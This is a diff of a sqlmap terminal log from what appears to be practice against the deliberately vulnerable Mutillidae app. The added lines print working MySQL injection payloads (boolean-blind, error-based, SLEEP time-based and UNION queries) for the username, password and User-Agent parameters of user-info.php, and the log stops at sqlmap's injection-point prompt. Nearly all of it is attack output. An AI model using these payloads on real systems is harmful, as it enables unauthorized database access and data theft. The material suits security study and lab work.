@@ -1,15 +1,62 @@
         ___
        __H__
- ___ ___[)]_____ ___ ___  {1.6#stable}
-|_ -| . [(]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
+ ___ ___[,]_____ ___ ___  {1.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 08:48:52 /2022-04-24/
+[*] starting @ 09:12:34 /2022-04-24/
 
-[08:48:52] [CRITICAL] specified HTTP request file '~mutillidae_user.txt' does not exist
+[09:12:34] [INFO] parsing HTTP request from '/home/kali/Documents/mutillidae_user.txt'
+[09:12:34] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[09:12:34] [INFO] resuming back-end DBMS 'mysql' 
+[09:12:34] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: password (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: page=user-info.php&username=123&password=' OR NOT 6122=6122#&user-info-php-submit-button=View Account Details
 
-[*] ending @ 08:48:52 /2022-04-24/
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: page=user-info.php&username=123&password=' OR ROW(2424,4231)>(SELECT COUNT(*),CONCAT(0x7170706271,(SELECT (ELT(2424=2424,1))),0x716b627871,FLOOR(RAND(0)*2))x FROM (SELECT 6998 UNION SELECT 5118 UNION SELECT 8617 UNION SELECT 6723)a GROUP BY x)-- nDhm&user-info-php-submit-button=View Account Details
 
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=user-info.php&username=123&password=' AND (SELECT 4159 FROM (SELECT(SLEEP(5)))JgTE)-- tbDR&user-info-php-submit-button=View Account Details
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: page=user-info.php&username=123&password=' UNION ALL SELECT NULL,CONCAT(0x7170706271,0x5556566f6773535861566c737563546f4d71625a655a467a69766f694243676b4c59737a43644853,0x716b627871),NULL,NULL,NULL#&user-info-php-submit-button=View Account Details
+
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: page=user-info.php&username=123' OR NOT 8573=8573#&password=&user-info-php-submit-button=View Account Details
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: page=user-info.php&username=123' OR ROW(9281,7922)>(SELECT COUNT(*),CONCAT(0x7170706271,(SELECT (ELT(9281=9281,1))),0x716b627871,FLOOR(RAND(0)*2))x FROM (SELECT 7799 UNION SELECT 7065 UNION SELECT 6953 UNION SELECT 2533)a GROUP BY x)-- RCiC&password=&user-info-php-submit-button=View Account Details
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=user-info.php&username=123' AND (SELECT 2211 FROM (SELECT(SLEEP(5)))OwtV)-- sNtg&password=&user-info-php-submit-button=View Account Details
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: page=user-info.php&username=123' UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x726b6e7a544d6a54546877634f48454163434865454a594f6342496372565a73496e4e7563555446,0x716b627871),NULL,NULL#&password=&user-info-php-submit-button=View Account Details
+
+Parameter: User-Agent (User-Agent)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' AND (SELECT 3890 FROM (SELECT(SLEEP(5)))iQde) AND 'nvBb'='nvBb
+---
+there were multiple injection points, please select the one to use for following injections:
+[0] place: GET, parameter: username, type: Single quoted string (default)
+[1] place: GET, parameter: password, type: Single quoted string
+[2] place: User-Agent, parameter: User-Agent, type: Single quoted string
+[q] Quit
+> 
